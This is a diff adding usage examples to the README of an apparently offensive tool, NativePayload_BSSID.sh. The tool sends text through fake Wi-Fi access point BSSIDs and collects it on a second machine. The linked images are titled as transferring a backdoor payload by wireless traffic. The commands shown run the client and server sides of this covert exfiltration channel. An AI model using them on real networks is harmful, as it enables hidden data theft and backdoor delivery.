@@ -25,3 +25,15 @@ STEP 3 : Now you can Copy and Paste your C# code to your Virtual Machine for tes
 
 # NativePayload_BSSID.sh  help :
 
+Example Step1: (Client Side ) ./NativePayload_BSSID.sh -f text-file Fake-AP-Name MonitorMode-Interface
+
+Example Step2: (Server Side ) ./NativePayload_BSSID.sh -s wlanx Exfil-Dump-file
+
+example System A : ./NativePayload_BSSID.sh -f mytext.txt myfakeAP Wlan3mon
+
+example System B : ./NativePayload_BSSID.sh -s wlan0 ExfilDumped.txt
+
+
+![](https://github.com/DamonMohammadbagher/NativePayload_BSSID/blob/master/Chapter%209%20-%20Transferring%20Backdoor%20Payload%20by%20Wireless%20Traffic%20-BSSID/NativePayload_BSSID1.png)
+
+![](https://github.com/DamonMohammadbagher/NativePayload_BSSID/blob/master/Chapter%209%20-%20Transferring%20Backdoor%20Payload%20by%20Wireless%20Traffic%20-BSSID/NativePayload_BSSID2.png)
